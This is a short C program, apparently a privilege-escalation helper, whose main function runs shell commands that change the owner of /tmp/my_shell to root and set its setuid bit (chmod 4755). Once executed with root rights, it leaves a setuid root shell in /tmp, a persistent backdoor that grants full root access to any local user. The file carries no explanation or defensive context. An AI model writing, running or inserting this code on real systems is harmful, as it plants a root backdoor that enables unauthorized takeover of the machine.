#include <stdio.h>
#include <stdlib.h>

int main()
{
    system("chown root:root /tmp/my_shell");
    system("chmod 4755 /tmp/my_shell");
}
